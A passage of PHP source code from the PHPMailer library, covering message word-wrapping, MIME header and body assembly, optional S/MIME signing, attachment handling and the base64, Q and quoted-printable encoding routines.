        if ($qp_mode) {
            $soft_break = sprintf(' =%s', $this->LE);
        } else {
            $soft_break = $this->LE;
        }
        // If utf-8 encoding is used, we will need to make sure we don't
        // split multibyte characters when we wrap
        $is_utf8 = (strtolower($this->CharSet) == 'utf-8');
        $lelen = strlen($this->LE);
        $crlflen = strlen(self::CRLF);

        $message = $this->fixEOL($message);
        //Remove a trailing line break
        if (substr($message, -$lelen) == $this->LE) {
            $message = substr($message, 0, -$lelen);
        }

        //Split message into lines
        $lines = explode($this->LE, $message);
        //Message will be rebuilt in here
        $message = '';
        foreach ($lines as $line) {
            $words = explode(' ', $line);
            $buf = '';
            $firstword = true;
            foreach ($words as $word) {
                if ($qp_mode and (strlen($word) > $length)) {
                    $space_left = $length - strlen($buf) - $crlflen;
                    if (!$firstword) {
                        if ($space_left > 20) {
                            $len = $space_left;
                            if ($is_utf8) {
                                $len = $this->utf8CharBoundary($word, $len);
                            } elseif (substr($word, $len - 1, 1) == '=') {
                                $len--;
                            } elseif (substr($word, $len - 2, 1) == '=') {
                                $len -= 2;
                            }
                            $part = substr($word, 0, $len);
                            $word = substr($word, $len);
                            $buf .= ' ' . $part;
                            $message .= $buf . sprintf('=%s', self::CRLF);
                        } else {
                            $message .= $buf . $soft_break;
                        }
                        $buf = '';
                    }
                    while (strlen($word) > 0) {
                        if ($length <= 0) {
                            break;
                        }
                        $len = $length;
                        if ($is_utf8) {
                            $len = $this->utf8CharBoundary($word, $len);
                        } elseif (substr($word, $len - 1, 1) == '=') {
                            $len--;
                        } elseif (substr($word, $len - 2, 1) == '=') {
                            $len -= 2;
                        }
                        $part = substr($word, 0, $len);
                        $word = substr($word, $len);

                        if (strlen($word) > 0) {
                            $message .= $part . sprintf('=%s', self::CRLF);
                        } else {
                            $buf = $part;
                        }
                    }
                } else {
                    $buf_o = $buf;
                    if (!$firstword) {
                        $buf .= ' ';
                    }
                    $buf .= $word;

                    if (strlen($buf) > $length and $buf_o != '') {
                        $message .= $buf_o . $soft_break;
                        $buf = $word;
                    }
                }
                $firstword = false;
            }
            $message .= $buf . self::CRLF;
        }

        return $message;
    }

    /**
     * Find the last character boundary prior to $maxLength in a utf-8
     * quoted-printable encoded string.
     * Original written by Colin Brown.
     * @access public
     * @param string $encodedText utf-8 QP text
     * @param integer $maxLength Find the last character boundary prior to this length
     * @return integer
     */
    public function utf8CharBoundary($encodedText, $maxLength)
    {
        $foundSplitPos = false;
        $lookBack = 3;
        while (!$foundSplitPos) {
            $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
            $encodedCharPos = strpos($lastChunk, '=');
            if (false !== $encodedCharPos) {
                // Found start of encoded character byte within $lookBack block.
                // Check the encoded byte value (the 2 chars after the '=')
                $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
                $dec = hexdec($hex);
                if ($dec < 128) {
                    // Single byte character.
                    // If the encoded char was found at pos 0, it will fit
                    // otherwise reduce maxLength to start of the encoded char
                    if ($encodedCharPos > 0) {
                        $maxLength = $maxLength - ($lookBack - $encodedCharPos);
                    }
                    $foundSplitPos = true;
                } elseif ($dec >= 192) {
                    // First byte of a multi byte character
                    // Reduce maxLength to split at start of character
                    $maxLength = $maxLength - ($lookBack - $encodedCharPos);
                    $foundSplitPos = true;
                } elseif ($dec < 192) {
                    // Middle byte of a multi byte character, look further back
                    $lookBack += 3;
                }
            } else {
                // No encoded character found
                $foundSplitPos = true;
            }
        }
        return $maxLength;
    }

    /**
     * Apply word wrapping to the message body.
     * Wraps the message body to the number of chars set in the WordWrap property.
     * You should only do this to plain-text bodies as wrapping HTML tags may break them.
     * This is called automatically by createBody(), so you don't need to call it yourself.
     * @access public
     * @return void
     */
    public function setWordWrap()
    {
        if ($this->WordWrap < 1) {
            return;
        }

        switch ($this->message_type) {
            case 'alt':
            case 'alt_inline':
            case 'alt_attach':
            case 'alt_inline_attach':
                $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap);
                break;
            default:
                $this->Body = $this->wrapText($this->Body, $this->WordWrap);
                break;
        }
    }

    /**
     * Assemble message headers.
     * @access public
     * @return string The assembled headers
     */
    public function createHeader()
    {
        $result = '';

        $result .= $this->headerLine('Date', $this->MessageDate == '' ? self::rfcDate() : $this->MessageDate);

        // To be created automatically by mail()
        if ($this->SingleTo) {
            if ($this->Mailer != 'mail') {
                foreach ($this->to as $toaddr) {
                    $this->SingleToArray[] = $this->addrFormat($toaddr);
                }
            }
        } else {
            if (count($this->to) > 0) {
                if ($this->Mailer != 'mail') {
                    $result .= $this->addrAppend('To', $this->to);
                }
            } elseif (count($this->cc) == 0) {
                $result .= $this->headerLine('To', 'undisclosed-recipients:;');
            }
        }

        $result .= $this->addrAppend('From', array(array(trim($this->From), $this->FromName)));

        // sendmail and mail() extract Cc from the header before sending
        if (count($this->cc) > 0) {
            $result .= $this->addrAppend('Cc', $this->cc);
        }

        // sendmail and mail() extract Bcc from the header before sending
        if ((
                $this->Mailer == 'sendmail' or $this->Mailer == 'qmail' or $this->Mailer == 'mail'
            )
            and count($this->bcc) > 0
        ) {
            $result .= $this->addrAppend('Bcc', $this->bcc);
        }

        if (count($this->ReplyTo) > 0) {
            $result .= $this->addrAppend('Reply-To', $this->ReplyTo);
        }

        // mail() sets the subject itself
        if ($this->Mailer != 'mail') {
            $result .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject)));
        }

        // Only allow a custom message ID if it conforms to RFC 5322 section 3.6.4
        // https://tools.ietf.org/html/rfc5322#section-3.6.4
        if ('' != $this->MessageID and preg_match('/^<.*@.*>$/', $this->MessageID)) {
            $this->lastMessageID = $this->MessageID;
        } else {
            $this->lastMessageID = sprintf('<%s@%s>', $this->uniqueid, $this->serverHostname());
        }
        $result .= $this->headerLine('Message-ID', $this->lastMessageID);
        if (!is_null($this->Priority)) {
            $result .= $this->headerLine('X-Priority', $this->Priority);
        }
        if ($this->XMailer == '') {
            $result .= $this->headerLine(
                'X-Mailer',
                'PHPMailer ' . $this->Version . ' (https://github.com/PHPMailer/PHPMailer)'
            );
        } else {
            $myXmailer = trim($this->XMailer);
            if ($myXmailer) {
                $result .= $this->headerLine('X-Mailer', $myXmailer);
            }
        }

        if ($this->ConfirmReadingTo != '') {
            $result .= $this->headerLine('Disposition-Notification-To', '<' . $this->ConfirmReadingTo . '>');
        }

        // Add custom headers
        foreach ($this->CustomHeader as $header) {
            $result .= $this->headerLine(
                trim($header[0]),
                $this->encodeHeader(trim($header[1]))
            );
        }
        if (!$this->sign_key_file) {
            $result .= $this->headerLine('MIME-Version', '1.0');
            $result .= $this->getMailMIME();
        }

        return $result;
    }

    /**
     * Get the message MIME type headers.
     * @access public
     * @return string
     */
    public function getMailMIME()
    {
        $result = '';
        $ismultipart = true;
        switch ($this->message_type) {
            case 'inline':
                $result .= $this->headerLine('Content-Type', 'multipart/related;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            case 'attach':
            case 'inline_attach':
            case 'alt_attach':
            case 'alt_inline_attach':
                $result .= $this->headerLine('Content-Type', 'multipart/mixed;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            case 'alt':
            case 'alt_inline':
                $result .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $result .= $this->textLine("\tboundary=\"" . $this->boundary[1] . '"');
                break;
            default:
                // Catches case 'plain': and case '':
                $result .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet);
                $ismultipart = false;
                break;
        }
        // RFC1341 part 5 says 7bit is assumed if not specified
        if ($this->Encoding != '7bit') {
            // RFC 2045 section 6.4 says multipart MIME parts may only use 7bit, 8bit or binary CTE
            if ($ismultipart) {
                if ($this->Encoding == '8bit') {
                    $result .= $this->headerLine('Content-Transfer-Encoding', '8bit');
                }
                // The only remaining alternatives are quoted-printable and base64, which are both 7bit compatible
            } else {
                $result .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding);
            }
        }

        if ($this->Mailer != 'mail') {
            $result .= $this->LE;
        }

        return $result;
    }

    /**
     * Returns the whole MIME message.
     * Includes complete headers and body.
     * Only valid post preSend().
     * @see PHPMailer::preSend()
     * @access public
     * @return string
     */
    public function getSentMIMEMessage()
    {
        return rtrim($this->MIMEHeader . $this->mailHeader, "\n\r") . self::CRLF . self::CRLF . $this->MIMEBody;
    }

    /**
     * Create unique ID
     * @return string
     */
    protected function generateId() {
        return md5(uniqid(time()));
    }

    /**
     * Assemble the message body.
     * Returns an empty string on failure.
     * @access public
     * @throws phpmailerException
     * @return string The assembled message body
     */
    public function createBody()
    {
        $body = '';
        //Create unique IDs and preset boundaries
        $this->uniqueid = $this->generateId();
        $this->boundary[1] = 'b1_' . $this->uniqueid;
        $this->boundary[2] = 'b2_' . $this->uniqueid;
        $this->boundary[3] = 'b3_' . $this->uniqueid;

        if ($this->sign_key_file) {
            $body .= $this->getMailMIME() . $this->LE;
        }

        $this->setWordWrap();

        $bodyEncoding = $this->Encoding;
        $bodyCharSet = $this->CharSet;
        //Can we do a 7-bit downgrade?
        if ($bodyEncoding == '8bit' and !$this->has8bitChars($this->Body)) {
            $bodyEncoding = '7bit';
            //All ISO 8859, Windows codepage and UTF-8 charsets are ascii compatible up to 7-bit
            $bodyCharSet = 'us-ascii';
        }
        //If lines are too long, and we're not already using an encoding that will shorten them,
        //change to quoted-printable transfer encoding for the body part only
        if ('base64' != $this->Encoding and self::hasLineLongerThanMax($this->Body)) {
            $bodyEncoding = 'quoted-printable';
        }

        $altBodyEncoding = $this->Encoding;
        $altBodyCharSet = $this->CharSet;
        //Can we do a 7-bit downgrade?
        if ($altBodyEncoding == '8bit' and !$this->has8bitChars($this->AltBody)) {
            $altBodyEncoding = '7bit';
            //All ISO 8859, Windows codepage and UTF-8 charsets are ascii compatible up to 7-bit
            $altBodyCharSet = 'us-ascii';
        }
        //If lines are too long, and we're not already using an encoding that will shorten them,
        //change to quoted-printable transfer encoding for the alt body part only
        if ('base64' != $altBodyEncoding and self::hasLineLongerThanMax($this->AltBody)) {
            $altBodyEncoding = 'quoted-printable';
        }
        //Use this as a preamble in all multipart message types
        $mimepre = "This is a multi-part message in MIME format." . $this->LE . $this->LE;
        switch ($this->message_type) {
            case 'inline':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[1]);
                break;
            case 'attach':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'inline_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, '', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'alt':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                if (!empty($this->Ical)) {
                    $body .= $this->getBoundary($this->boundary[1], '', 'text/calendar; method=REQUEST', '');
                    $body .= $this->encodeString($this->Ical, $this->Encoding);
                    $body .= $this->LE . $this->LE;
                }
                $body .= $this->endBoundary($this->boundary[1]);
                break;
            case 'alt_inline':
                $body .= $mimepre;
                $body .= $this->getBoundary($this->boundary[1], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->endBoundary($this->boundary[1]);
                break;
            case 'alt_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->endBoundary($this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            case 'alt_inline_attach':
                $body .= $mimepre;
                $body .= $this->textLine('--' . $this->boundary[1]);
                $body .= $this->headerLine('Content-Type', 'multipart/alternative;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[2] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[2], $altBodyCharSet, 'text/plain', $altBodyEncoding);
                $body .= $this->encodeString($this->AltBody, $altBodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->textLine('--' . $this->boundary[2]);
                $body .= $this->headerLine('Content-Type', 'multipart/related;');
                $body .= $this->textLine("\tboundary=\"" . $this->boundary[3] . '"');
                $body .= $this->LE;
                $body .= $this->getBoundary($this->boundary[3], $bodyCharSet, 'text/html', $bodyEncoding);
                $body .= $this->encodeString($this->Body, $bodyEncoding);
                $body .= $this->LE . $this->LE;
                $body .= $this->attachAll('inline', $this->boundary[3]);
                $body .= $this->LE;
                $body .= $this->endBoundary($this->boundary[2]);
                $body .= $this->LE;
                $body .= $this->attachAll('attachment', $this->boundary[1]);
                break;
            default:
                // Catch case 'plain' and case '', applies to simple `text/plain` and `text/html` body content types
                //Reset the `Encoding` property in case we changed it for line length reasons
                $this->Encoding = $bodyEncoding;
                $body .= $this->encodeString($this->Body, $this->Encoding);
                break;
        }

        if ($this->isError()) {
            $body = '';
        } elseif ($this->sign_key_file) {
            try {
                if (!defined('PKCS7_TEXT')) {
                    throw new phpmailerException($this->lang('extension_missing') . 'openssl');
                }
                // @TODO would be nice to use php://temp streams here, but need to wrap for PHP < 5.1
                $file = tempnam(sys_get_temp_dir(), 'mail');
                if (false === file_put_contents($file, $body)) {
                    throw new phpmailerException($this->lang('signing') . ' Could not write temp file');
                }
                $signed = tempnam(sys_get_temp_dir(), 'signed');
                //Workaround for PHP bug https://bugs.php.net/bug.php?id=69197
                if (empty($this->sign_extracerts_file)) {
                    $sign = @openssl_pkcs7_sign(
                        $file,
                        $signed,
                        'file://' . realpath($this->sign_cert_file),
                        array('file://' . realpath($this->sign_key_file), $this->sign_key_pass),
                        null
                    );
                } else {
                    $sign = @openssl_pkcs7_sign(
                        $file,
                        $signed,
                        'file://' . realpath($this->sign_cert_file),
                        array('file://' . realpath($this->sign_key_file), $this->sign_key_pass),
                        null,
                        PKCS7_DETACHED,
                        $this->sign_extracerts_file
                    );
                }
                if ($sign) {
                    @unlink($file);
                    $body = file_get_contents($signed);
                    @unlink($signed);
                    //The message returned by openssl contains both headers and body, so need to split them up
                    $parts = explode("\n\n", $body, 2);
                    $this->MIMEHeader .= $parts[0] . $this->LE . $this->LE;
                    $body = $parts[1];
                } else {
                    @unlink($file);
                    @unlink($signed);
                    throw new phpmailerException($this->lang('signing') . openssl_error_string());
                }
            } catch (phpmailerException $exc) {
                $body = '';
                if ($this->exceptions) {
                    throw $exc;
                }
            }
        }
        return $body;
    }

    /**
     * Return the start of a message boundary.
     * @access protected
     * @param string $boundary
     * @param string $charSet
     * @param string $contentType
     * @param string $encoding
     * @return string
     */
    protected function getBoundary($boundary, $charSet, $contentType, $encoding)
    {
        $result = '';
        if ($charSet == '') {
            $charSet = $this->CharSet;
        }
        if ($contentType == '') {
            $contentType = $this->ContentType;
        }
        if ($encoding == '') {
            $encoding = $this->Encoding;
        }
        $result .= $this->textLine('--' . $boundary);
        $result .= sprintf('Content-Type: %s; charset=%s', $contentType, $charSet);
        $result .= $this->LE;
        // RFC1341 part 5 says 7bit is assumed if not specified
        if ($encoding != '7bit') {
            $result .= $this->headerLine('Content-Transfer-Encoding', $encoding);
        }
        $result .= $this->LE;

        return $result;
    }

    /**
     * Return the end of a message boundary.
     * @access protected
     * @param string $boundary
     * @return string
     */
    protected function endBoundary($boundary)
    {
        return $this->LE . '--' . $boundary . '--' . $this->LE;
    }

    /**
     * Set the message type.
     * PHPMailer only supports some preset message types, not arbitrary MIME structures.
     * @access protected
     * @return void
     */
    protected function setMessageType()
    {
        $type = array();
        if ($this->alternativeExists()) {
            $type[] = 'alt';
        }
        if ($this->inlineImageExists()) {
            $type[] = 'inline';
        }
        if ($this->attachmentExists()) {
            $type[] = 'attach';
        }
        $this->message_type = implode('_', $type);
        if ($this->message_type == '') {
            //The 'plain' message_type refers to the message having a single body element, not that it is plain-text
            $this->message_type = 'plain';
        }
    }

    /**
     * Format a header line.
     * @access public
     * @param string $name
     * @param string $value
     * @return string
     */
    public function headerLine($name, $value)
    {
        return $name . ': ' . $value . $this->LE;
    }

    /**
     * Return a formatted mail line.
     * @access public
     * @param string $value
     * @return string
     */
    public function textLine($value)
    {
        return $value . $this->LE;
    }

    /**
     * Add an attachment from a path on the filesystem.
     * Never use a user-supplied path to a file!
     * Returns false if the file could not be found or read.
     * Explicitly *does not* support passing URLs; PHPMailer is not an HTTP client.
     * If you need to do that, fetch the resource yourself and pass it in via a local file or string.
     * @param string $path Path to the attachment.
     * @param string $name Overrides the attachment name.
     * @param string $encoding File encoding (see $Encoding).
     * @param string $type File extension (MIME) type.
     * @param string $disposition Disposition to use
     * @throws phpmailerException
     * @return boolean
     */
    public function addAttachment($path, $name = '', $encoding = 'base64', $type = '', $disposition = 'attachment')
    {
        try {
            if (!self::isPermittedPath($path) or !@is_file($path)) {
                throw new phpmailerException($this->lang('file_access') . $path, self::STOP_CONTINUE);
            }

            // If a MIME type is not specified, try to work it out from the file name
            if ($type == '') {
                $type = self::filenameToType($path);
            }

            $filename = basename($path);
            if ($name == '') {
                $name = $filename;
            }

            $this->attachment[] = array(
                0 => $path,
                1 => $filename,
                2 => $name,
                3 => $encoding,
                4 => $type,
                5 => false, // isStringAttachment
                6 => $disposition,
                7 => 0
            );

        } catch (phpmailerException $exc) {
            $this->setError($exc->getMessage());
            $this->edebug($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
        return true;
    }

    /**
     * Return the array of attachments.
     * @return array
     */
    public function getAttachments()
    {
        return $this->attachment;
    }

    /**
     * Attach all file, string, and binary attachments to the message.
     * Returns an empty string on failure.
     * @access protected
     * @param string $disposition_type
     * @param string $boundary
     * @return string
     */
    protected function attachAll($disposition_type, $boundary)
    {
        // Return text of body
        $mime = array();
        $cidUniq = array();
        $incl = array();

        // Add all attachments
        foreach ($this->attachment as $attachment) {
            // Check if it is a valid disposition_filter
            if ($attachment[6] == $disposition_type) {
                // Check for string attachment
                $string = '';
                $path = '';
                $bString = $attachment[5];
                if ($bString) {
                    $string = $attachment[0];
                } else {
                    $path = $attachment[0];
                }

                $inclhash = md5(serialize($attachment));
                if (in_array($inclhash, $incl)) {
                    continue;
                }
                $incl[] = $inclhash;
                $name = $attachment[2];
                $encoding = $attachment[3];
                $type = $attachment[4];
                $disposition = $attachment[6];
                $cid = $attachment[7];
                if ($disposition == 'inline' && array_key_exists($cid, $cidUniq)) {
                    continue;
                }
                $cidUniq[$cid] = true;

                $mime[] = sprintf('--%s%s', $boundary, $this->LE);
                //Only include a filename property if we have one
                if (!empty($name)) {
                    $mime[] = sprintf(
                        'Content-Type: %s; name="%s"%s',
                        $type,
                        $this->encodeHeader($this->secureHeader($name)),
                        $this->LE
                    );
                } else {
                    $mime[] = sprintf(
                        'Content-Type: %s%s',
                        $type,
                        $this->LE
                    );
                }
                // RFC1341 part 5 says 7bit is assumed if not specified
                if ($encoding != '7bit') {
                    $mime[] = sprintf('Content-Transfer-Encoding: %s%s', $encoding, $this->LE);
                }

                if ($disposition == 'inline') {
                    $mime[] = sprintf('Content-ID: <%s>%s', $cid, $this->LE);
                }

                // If a filename contains any of these chars, it should be quoted,
                // but not otherwise: RFC2183 & RFC2045 5.1
                // Fixes a warning in IETF's msglint MIME checker
                // Allow for bypassing the Content-Disposition header totally
                if (!(empty($disposition))) {
                    $encoded_name = $this->encodeHeader($this->secureHeader($name));
                    if (preg_match('/[ \(\)<>@,;:\\"\/\[\]\?=]/', $encoded_name)) {
                        $mime[] = sprintf(
                            'Content-Disposition: %s; filename="%s"%s',
                            $disposition,
                            $encoded_name,
                            $this->LE . $this->LE
                        );
                    } else {
                        if (!empty($encoded_name)) {
                            $mime[] = sprintf(
                                'Content-Disposition: %s; filename=%s%s',
                                $disposition,
                                $encoded_name,
                                $this->LE . $this->LE
                            );
                        } else {
                            $mime[] = sprintf(
                                'Content-Disposition: %s%s',
                                $disposition,
                                $this->LE . $this->LE
                            );
                        }
                    }
                } else {
                    $mime[] = $this->LE;
                }

                // Encode as string attachment
                if ($bString) {
                    $mime[] = $this->encodeString($string, $encoding);
                    if ($this->isError()) {
                        return '';
                    }
                    $mime[] = $this->LE . $this->LE;
                } else {
                    $mime[] = $this->encodeFile($path, $encoding);
                    if ($this->isError()) {
                        return '';
                    }
                    $mime[] = $this->LE . $this->LE;
                }
            }
        }

        $mime[] = sprintf('--%s--%s', $boundary, $this->LE);

        return implode('', $mime);
    }

    /**
     * Encode a file attachment in requested format.
     * Returns an empty string on failure.
     * @param string $path The full path to the file
     * @param string $encoding The encoding to use; one of 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
     * @throws phpmailerException
     * @access protected
     * @return string
     */
    protected function encodeFile($path, $encoding = 'base64')
    {
        try {
            if (!self::isPermittedPath($path) or !file_exists($path)) {
                throw new phpmailerException($this->lang('file_open') . $path, self::STOP_CONTINUE);
            }
            $magic_quotes = false;
            if( version_compare(PHP_VERSION, '7.4.0', '<') ) {
                $magic_quotes = get_magic_quotes_runtime();
            }
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime(false);
                } else {
                    //Doesn't exist in PHP 5.4, but we don't need to check because
                    //get_magic_quotes_runtime always returns false in 5.4+
                    //so it will never get here
                    ini_set('magic_quotes_runtime', false);
                }
            }
            $file_buffer = file_get_contents($path);
            $file_buffer = $this->encodeString($file_buffer, $encoding);
            if ($magic_quotes) {
                if (version_compare(PHP_VERSION, '5.3.0', '<')) {
                    set_magic_quotes_runtime($magic_quotes);
                } else {
                    ini_set('magic_quotes_runtime', $magic_quotes);
                }
            }
            return $file_buffer;
        } catch (Exception $exc) {
            $this->setError($exc->getMessage());
            return '';
        }
    }

    /**
     * Encode a string in requested format.
     * Returns an empty string on failure.
     * @param string $str The text to encode
     * @param string $encoding The encoding to use; one of 'base64', '7bit', '8bit', 'binary', 'quoted-printable'
     * @access public
     * @return string
     */
    public function encodeString($str, $encoding = 'base64')
    {
        $encoded = '';
        switch (strtolower($encoding)) {
            case 'base64':
                $encoded = chunk_split(base64_encode($str), 76, $this->LE);
                break;
            case '7bit':
            case '8bit':
                $encoded = $this->fixEOL($str);
                // Make sure it ends with a line break
                if (substr($encoded, -(strlen($this->LE))) != $this->LE) {
                    $encoded .= $this->LE;
                }
                break;
            case 'binary':
                $encoded = $str;
                break;
            case 'quoted-printable':
                $encoded = $this->encodeQP($str);
                break;
            default:
                $this->setError($this->lang('encoding') . $encoding);
                break;
        }
        return $encoded;
    }

    /**
     * Encode a header string optimally.
     * Picks shortest of Q, B, quoted-printable or none.
     * @access public
     * @param string $str
     * @param string $position
     * @return string
     */
    public function encodeHeader($str, $position = 'text')
    {
        $matchcount = 0;
        switch (strtolower($position)) {
            case 'phrase':
                if (!preg_match('/[\200-\377]/', $str)) {
                    // Can't use addslashes as we don't know the value of magic_quotes_sybase
                    $encoded = addcslashes($str, "\0..\37\177\\\"");
                    if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) {
                        return ($encoded);
                    } else {
                        return ("\"$encoded\"");
                    }
                }
                $matchcount = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
                break;
            /** @noinspection PhpMissingBreakStatementInspection */
            case 'comment':
                $matchcount = preg_match_all('/[()"]/', $str, $matches);
                // Intentional fall-through
            case 'text':
            default:
                $matchcount += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
                break;
        }

        //There are no chars that need encoding
        if ($matchcount == 0) {
            return ($str);
        }

        $maxlen = 75 - 7 - strlen($this->CharSet);
        // Try to select the encoding which should produce the shortest output
        if ($matchcount > strlen($str) / 3) {
            // More than a third of the content will need encoding, so B encoding will be most efficient
            $encoding = 'B';
            if (function_exists('mb_strlen') && $this->hasMultiBytes($str)) {
                // Use a custom function which correctly encodes and wraps long
                // multibyte strings without breaking lines within a character
                $encoded = $this->base64EncodeWrapMB($str, "\n");
            } else {
                $encoded = base64_encode($str);
                $maxlen -= $maxlen % 4;
                $encoded = trim(chunk_split($encoded, $maxlen, "\n"));
            }
        } else {
            $encoding = 'Q';
            $encoded = $this->encodeQ($str, $position);
            $encoded = $this->wrapText($encoded, $maxlen, true);
            $encoded = str_replace('=' . self::CRLF, "\n", trim($encoded));
        }

        $encoded = preg_replace('/^(.*)$/m', ' =?' . $this->CharSet . "?$encoding?\\1?=", $encoded);
        $encoded = trim(str_replace("\n", $this->LE, $encoded));

        return $encoded;
    }

    /**
     * Check if a string contains multi-byte characters.
     * @access public
     * @param string $str multi-byte text to wrap encode
     * @return boolean
     */
    public function hasMultiBytes($str)
    {
        if (function_exists('mb_strlen')) {
            return (strlen($str) > mb_strlen($str, $this->CharSet));
        } else { // Assume no multibytes (we can't handle without mbstring functions anyway)
            return false;
        }
    }

    /**
     * Does a string contain any 8-bit chars (in any charset)?
     * @param string $text
     * @return boolean
     */
    public function has8bitChars($text)
    {
        return (boolean)preg_match('/[\x80-\xFF]/', $text);
    }

    /**
     * Encode and wrap long multibyte strings for mail headers
     * without breaking lines within a character.
     * Adapted from a function by paravoid
     * @link http://www.php.net/manual/en/function.mb-encode-mimeheader.php#60283
     * @access public
     * @param string $str multi-byte text to wrap encode
     * @param string $linebreak string to use as linefeed/end-of-line
     * @return string
     */
    public function base64EncodeWrapMB($str, $linebreak = null)
    {
        $start = '=?' . $this->CharSet . '?B?';
        $end = '?=';
        $encoded = '';
        if ($linebreak === null) {
            $linebreak = $this->LE;
        }

        $mb_length = mb_strlen($str, $this->CharSet);
        // Each line must have length <= 75, including $start and $end
        $length = 75 - strlen($start) - strlen($end);
        // Average multi-byte ratio
        $ratio = $mb_length / strlen($str);
        // Base64 has a 4:3 ratio
        $avgLength = floor($length * $ratio * .75);

        for ($i = 0; $i < $mb_length; $i += $offset) {
            $lookBack = 0;
            do {
                $offset = $avgLength - $lookBack;
                $chunk = mb_substr($str, $i, $offset, $this->CharSet);
                $chunk = base64_encode($chunk);
                $lookBack++;
            } while (strlen($chunk) > $length);
            $encoded .= $chunk . $linebreak;
        }

        // Chomp the last linefeed
        $encoded = substr($encoded, 0, -strlen($linebreak));
        return $encoded;
    }

    /**
     * Encode a string in quoted-printable format.
     * According to RFC2045 section 6.7.
     * @access public
     * @param string $string The text to encode
     * @param integer $line_max Number of chars allowed on a line before wrapping
     * @return string
     * @link http://www.php.net/manual/en/function.quoted-printable-decode.php#89417 Adapted from this comment
     */
    public function encodeQP($string, $line_max = 76)
    {
        // Use native function if it's available (>= PHP5.3)
        if (function_exists('quoted_printable_encode')) {
            return quoted_printable_encode($string);
        }
        // Fall back to a pure PHP implementation
        $string = str_replace(
            array('%20', '%0D%0A.', '%0D%0A', '%'),
            array(' ', "\r\n=2E", "\r\n", '='),
            rawurlencode($string)
        );
        return preg_replace('/[^\r\n]{' . ($line_max - 3) . '}[^=\r\n]{2}/', "$0=\r\n", $string);
    }

    /**
     * Backward compatibility wrapper for an old QP encoding function that was removed.
     * @see PHPMailer::encodeQP()
     * @access public
     * @param string $string
     * @param integer $line_max
     * @param boolean $space_conv
     * @return string
     * @deprecated Use encodeQP instead.
     */
    public function encodeQPphp(
        $string,
        $line_max = 76,
        /** @noinspection PhpUnusedParameterInspection */ $space_conv = false
    ) {
        return $this->encodeQP($string, $line_max);
    }

    /**
     * Encode a string using Q encoding.
     * @link http://tools.ietf.org/html/rfc2047
     * @param string $str the text to encode
     * @param string $position Where the text is going to be used, see the RFC for what that means
     * @access public
     * @return string
     */
    public function encodeQ($str, $position = 'text')
    {
        // There should not be any EOL in the string
        $pattern = '';
        $encoded = str_replace(array("\r", "\n"), '', $str);
        switch (strtolower($position)) {
            case 'phrase':
                // RFC 2047 section 5.3
